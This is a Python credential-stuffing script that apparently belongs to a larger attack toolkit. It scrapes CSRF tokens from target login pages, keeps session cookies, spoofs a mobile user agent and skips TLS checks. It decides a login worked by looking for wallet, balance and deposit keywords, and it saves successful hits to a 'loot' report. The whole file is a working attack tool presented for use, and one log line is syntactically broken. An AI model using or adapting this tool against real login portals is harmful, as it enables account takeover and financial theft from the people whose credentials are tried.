#!/usr/bin/env python3
"""
FORM_STUFFER.PY — Automated CSRF-Aware Credential Stuffing & Login Module
Features:
- Dynamically scrapes live CSRF tokens (_token) from target login pages
- Maintains session state & cookie jars across GET/POST cycles
- Submits valid or stuffed credentials against target login endpoints
- Automatically routes successful authentication states to the session loot reporter
"""
import sys
import re
import httpx
from bs4 import BeautifulSoup
from urllib.parse import urlsplit
from modules.live_login_verifier import save_loot_report

def log(msg, color="\033[92m"):
    sys.stdout.write(f"{color}{msg}\033[0m\n")
    sys.stdout.flush()

def execute_form_stuffing(target_url, username, password, login_path="/user/login"):
    parsed = urlsplit(target_url if "://" in target_url else f"https://{target_url}")
    base_url = f"{parsed.scheme}://{parsed.hostname}"
    if parsed.port:
        base_url += f":{parsed.port}"
    
    login_url = f"{base_url}{login_path}"
    log(f"\n[***] FORM STUFFER: Targeting login portal at {login_url} [***]", "\033[95m")

    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Referer": login_url
    }

    with httpx.Client(verify=False, follow_redirects=True, timeout=15.0) as client:
        try:
            # Step 1: GET the login page to harvest cookies and the dynamic CSRF token (_token)
            log([*] Fetching login form and harvesting CSRF token...", "\033[94m")
            get_resp = client.get(login_url, headers=headers)
            
            if get_resp.status_code != 200:
                log(f"[-] Failed to load login page. Status: {get_resp.status_code}", "\033[91m")
                return False

            # Parse HTML to find hidden CSRF token
            soup = BeautifulSoup(get_resp.text, "html.parser")
            token_input = soup.find("input", {"name": "_token"})
            
            csrf_token = token_input.get("value") if token_input else None
            if not csrf_token:
                # Regex fallback if BeautifulSoup misses it
                match = re.search(r'name="_token"\s+value="([^"]+)"', get_resp.text)
                if match:
                    csrf_token = match.group(1)

            if csrf_token:
                log(f"[+] Harvested active CSRF Token: {csrf_token[:15]}...", "\033[92m")
            else:
                log("[!] Warning: No CSRF token found. Proceeding with standard payload...", "\033[93m")

            # Step 2: Build payload with username, password, and CSRF token
            payload = {
                "username": username,
                "password": password
            }
            if csrf_token:
                payload["_token"] = csrf_token

            # Step 3: POST credentials to login action endpoint
            log(f"[*] Submitting credentials for user: {username}...", "\033[94m")
            post_resp = client.post(login_url, data=payload, headers=headers)
            
            status = post_resp.status_code
            body = post_resp.text

            # Step 4: Evaluate response for post-login indicators
            is_login_page = (
                "login" in post_resp.url.path.lower() or 
                'type="password"' in body.lower()
            )
            
            has_dashboard_indicators = any(k in body.lower() for k in [
                "dashboard", "user_id", "balance", "total deposit", 
                "welcome back", "logout", "settings", "wallet", "deposit"
            ])

            if status in (200, 302) and not is_login_page and has_dashboard_indicators:
                log(f"[!!!] SUCCESS! Credential stuffing successful! Access confirmed [HTTP {status}] [!!!]", "\033[91m")
                save_loot_report(login_path, status, body)
                return True
            else:
                log(f"[-] Login rejected or returned to login portal (Status: {status}).", "\033[93m")
                return False

        except Exception as exc:
            log(f"[-] Form stuffer execution error: {exc}", "\033[91m")
            return False

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 form_stuffer.py <target_url> <username> <password>")
        sys.exit(1)
    
    execute_form_stuffing(sys.argv[1], sys.argv[2], sys.argv[3])
